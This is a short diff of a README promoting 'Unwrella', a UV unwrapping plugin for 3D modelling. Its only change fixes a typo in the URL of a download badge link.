@@ -4,7 +4,7 @@ Unwrella is an innovative and highly efficient automatic UV unwrapping plugin de
 
 Whether you are creating hyper-realistic characters, intricate environments, or high-poly models, Unwrella ensures your UV maps are clean, distortion-free, and ready for texture painting, baking, or real-time rendering. It integrates effortlessly with popular 3D suites and empowers users with full control and automation in UV unwrapping.
 
-[![Download Unwrella](https://img.shields.io/badge/Download-Unwrella-blueviolet)](https;//unwrella-uv-unwrapping-plugin.github.io/.github)
+[![Download Unwrella](https://img.shields.io/badge/Download-Unwrella-blueviolet)](https://unwrella-uv-unwrapping-plugin.github.io/.github)
 
 ---
 
